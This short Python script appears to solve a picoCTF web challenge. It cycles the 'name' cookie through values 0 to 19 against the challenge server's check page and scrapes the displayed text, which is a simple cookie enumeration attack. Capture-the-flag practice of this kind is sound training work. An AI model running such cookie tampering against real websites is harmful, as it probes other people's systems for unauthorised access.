import re
import requests

for i in range(20):
    res = requests.get("http://mercury.picoctf.net:29649/check", cookies={'name': str(i)})
    m = re.search(r'(?<=\<p style="text-align:center; font-size:30px;">\<b>).*(?<=\</b>\</p>)', res.text)
    print(m.group(0))
